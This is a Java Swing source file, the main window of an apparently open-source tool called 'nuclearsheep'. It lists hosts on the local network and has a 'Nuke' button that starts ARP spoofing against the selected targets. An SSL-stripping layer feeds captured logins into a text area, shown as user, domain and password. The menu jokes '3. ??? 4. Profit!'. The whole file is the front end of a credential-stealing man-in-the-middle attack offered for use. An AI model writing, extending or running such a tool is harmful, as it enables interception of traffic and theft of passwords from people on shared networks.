/*
 * Copyright Matt Corallo and Colin Arnott 2012
 * 
 * This file is part of nuclearsheep.
 *
 * nuclearsheep is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
 *
 * nuclearsheep is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with Foobar. If not, see http://www.gnu.org/licenses/.
 */
package org.hatchunc.nuclearsheep;

import java.awt.Color;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.util.LinkedList;
import java.util.List;
import javax.swing.JFrame;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;
import javax.swing.event.ListDataEvent;
import javax.swing.event.ListDataListener;
import javax.swing.text.DefaultCaret;
import jpcap.NetworkInterface;

/**
 *
 * @author colin
 */
@SuppressWarnings("serial")
public class NuclearSheep extends javax.swing.JFrame implements UserInfoListener {

	ARPSpoofLayer arp;
	SSLStripLayer strip;
	List<IPMACPair> pairs;
	boolean button;
	ListSelectionModel listSelectionModel;
	
	
    /** Creates new form NuclearSheep */
    public NuclearSheep() {
    	this.setTitle("Nuclear Sheep");
    	
    	List<NetworkInterface> networkInterfaces = ARPSpoofLayer.getPotentialInterfaces();
    	if(networkInterfaces.size()==0)
    		System.exit(0);
    	NetworkInterface networkInterface = networkInterfaces.get(0);
    	try {
    		arp= new ARPSpoofLayer(networkInterface);
    		strip = new SSLStripLayer(networkInterface);
		} catch (IOException e) {
			try {
				if(strip!=null)	strip.stopSSLStrip();
				if(arp!=null)	arp.stopARPSpoofs();
			} catch (IOException e2) { }
			System.exit(0);
		}
    	try {
			Thread.sleep(5000);
		} catch (InterruptedException e2) {
			System.exit(0);
		}
    	pairs = arp.getIPMACPairs();
    	strip.registerUserInfoListener(this);
    	
    	//disable the close button
    	this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
    	//create custom close operation
    	this.addWindowListener(new WindowAdapter() {
    	      public void windowClosing(WindowEvent e) {
    				try {
    					strip.stopSSLStrip();
    					arp.stopARPSpoofs();
    				} catch (IOException e2) { }
    				System.exit(0);
    	      }
    	});
    	
    	initComponents();
    }

    /** This method is called from within the constructor to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings({ "unchecked", "rawtypes" })
    // <editor-fold defaultstate="collapsed" desc="Generated Code">
    private void initComponents() {
        bindingGroup = new org.jdesktop.beansbinding.BindingGroup();

      menuBar1 = new java.awt.MenuBar();  //menu implementation
        menu1 = new java.awt.Menu();
        jFrame1 = new javax.swing.JFrame();
        jFrame2 = new javax.swing.JFrame();
        filler1 = new javax.swing.Box.Filler(new java.awt.Dimension(0, 2), new java.awt.Dimension(0, 2), new java.awt.Dimension(32767, 2));
        filler2 = new javax.swing.Box.Filler(new java.awt.Dimension(0, 0), new java.awt.Dimension(0, 0), new java.awt.Dimension(32767, 32767));
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        jScrollPane2 = new javax.swing.JScrollPane();
        jList1 = new javax.swing.JList();
        jButton1 = new javax.swing.JButton();
      jMenuBar1 = new javax.swing.JMenuBar();  //menu implementation
        jMenu1 = new javax.swing.JMenu();

      menu1.setLabel("File");
        menuBar1.add(menu1);

        javax.swing.GroupLayout jFrame1Layout = new javax.swing.GroupLayout(jFrame1.getContentPane());
        jFrame1.getContentPane().setLayout(jFrame1Layout);
        jFrame1Layout.setHorizontalGroup(
            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame1Layout.setVerticalGroup(
            jFrame1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jFrame2Layout = new javax.swing.GroupLayout(jFrame2.getContentPane());
        jFrame2.getContentPane().setLayout(jFrame2Layout);
        jFrame2Layout.setHorizontalGroup(
            jFrame2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        jFrame2Layout.setVerticalGroup(
            jFrame2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jTextArea1.setEditable(false);
        DefaultCaret caret = (DefaultCaret)jTextArea1.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        jScrollPane1.setViewportView(jTextArea1);
        
        listSelectionModel = jList1.getSelectionModel();
        
        jList1Model = new javax.swing.AbstractListModel() {

        	public int getSize() { return pairs.size(); }
        	public Object getElementAt(int i) { return pairs.get(i).ip.getHostName(); }

        };
        jList1.setModel(jList1Model);
        jScrollPane2.setViewportView(jList1);

        jButton1.setText("Nuke");
        jButton1.setBackground(Color.red);
        jButton1.setForeground(Color.white);
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });
        
        
        //TODO: Implement Menu Window
      jMenu1.setText("1. Select your target(s)     2. Click Nuke    3. ???    4. Profit!");

        jMenuBar1.add(jMenu1);
        jMenu1.setEnabled(false);
        jMenuBar1.setEnabled(false);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(filler2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 171, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(filler1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 183, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 405, Short.MAX_VALUE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(21, 21, 21)
                        .addComponent(filler2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(34, 34, 34)
                        .addComponent(filler1, javax.swing.GroupLayout.PREFERRED_SIZE, 126, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 315, Short.MAX_VALUE)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 267, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );

        bindingGroup.bind();

        pack();
    }// </editor-fold>

private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {
	button=!button;
	if(button){
		List<IPMACPair> send = new LinkedList<IPMACPair>();
		int i=listSelectionModel.getMaxSelectionIndex(), j=listSelectionModel.getMinSelectionIndex();
		while(true){
			if(listSelectionModel.isSelectedIndex(i))
				send.add(pairs.get(i));
			if(i==j) break;
			i--;
		}
		jList1.setEnabled(false);
		arp.startARPSpoof(send);
		jButton1.setText("Stop");
		jButton1.setBackground(Color.green);
	}
	else{
		try {
			arp.stopARPSpoofs();
		} catch (IOException e) {
			try {
				strip.stopSSLStrip();
			} catch (IOException e2) { }
			System.exit(0);
		}
		pairs = arp.getIPMACPairs();
		for (ListDataListener listener : jList1Model.getListDataListeners()) {
			listener.contentsChanged(new ListDataEvent(jList1Model, ListDataEvent.CONTENTS_CHANGED, 0, pairs.size()));
		}
		jList1.repaint();
		jList1.setEnabled(true);
		jButton1.setText("Nuke");
		jButton1.setBackground(Color.red);
	}
	
}

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
    	/* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
        	UIManager.setLookAndFeel(
                    UIManager.getCrossPlatformLookAndFeelClassName());
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(NuclearSheep.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(NuclearSheep.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(NuclearSheep.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(NuclearSheep.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {

            public void run() {
                new NuclearSheep().setVisible(true);
            }
        });
    }
    
    // Variables declaration - do not modify
    private javax.swing.Box.Filler filler1;
    private javax.swing.Box.Filler filler2;
    private javax.swing.JButton jButton1;
    private javax.swing.JFrame jFrame1;
    private javax.swing.JFrame jFrame2;
    @SuppressWarnings("rawtypes")
	private javax.swing.JList jList1;
    private javax.swing.AbstractListModel jList1Model;
  private javax.swing.JMenu jMenu1;  //menu declarations
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JTextArea jTextArea1;
  private java.awt.Menu menu1;     //menu declarations
    private java.awt.MenuBar menuBar1;
    private java.awt.MenuBar menuBar2;
    private org.jdesktop.beansbinding.BindingGroup bindingGroup;
    // End of variables declaration


	@Override
	public void receiveNewUserInfo(UserInfo info) {
		jTextArea1.setText(jTextArea1.getText() + (jTextArea1.getText().equals("") ? "" : "\n") +
							info.userName + " logged onto " + info.domain + " with password: " + info.password);
	}
}
